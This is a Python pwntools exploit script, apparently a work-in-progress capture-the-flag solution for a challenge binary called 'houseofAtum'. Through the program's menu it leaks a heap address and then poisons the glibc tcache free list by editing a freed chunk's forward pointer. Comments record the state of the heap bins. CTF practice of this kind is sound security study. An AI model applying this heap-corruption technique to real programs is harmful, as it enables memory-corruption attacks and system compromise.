#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './houseofAtum'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil(':')
    io.sendline(str(idx))

def new(c):
    menu(1)
    io.recvuntil(":")
    io.send(c)

def edit(i, c):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    io.sendline(c)

def show(i):
    menu(4)
    io.recvuntil(":")
    io.sendline(str(i))

def delete(i, f = 0):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(i))
    io.recvuntil(":")
    if f == 1:
        io.sendline('y')
    else:
        io.sendline('n')

# leak heap addr
new('0')
new('1')
delete(1, 1)
delete(0, 1)
new('1')
show(0)
io.recvuntil("Content:")
heap_addr = myu64(io.recvn(6)) - 0x231
log.info("\033[33m" + hex(heap_addr) + "\033[0m")
delete(0, 1)

new('a')
delete(0)
edit(0, p64(heap_addr + 0x6a0)) # edit the FD
new('b') # malloc a new chunk 1

delete(0, 1) # delete will add it into the head of the tcache list again
# Tcachebins[idx=3, size=0x40] count=2  ←  Chunk(addr=0x555555757260, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x5555557576a0, size=0x0, flags=)

# but if we dont delete 0, we dont have enough chunks to allocate on the address we want
# chunk1 cant be freeed, because it will be added into the tcache list too
# this is all because these chunks are all of the same size, which is 0x40

gdb.attach(io, '')


io.interactive()
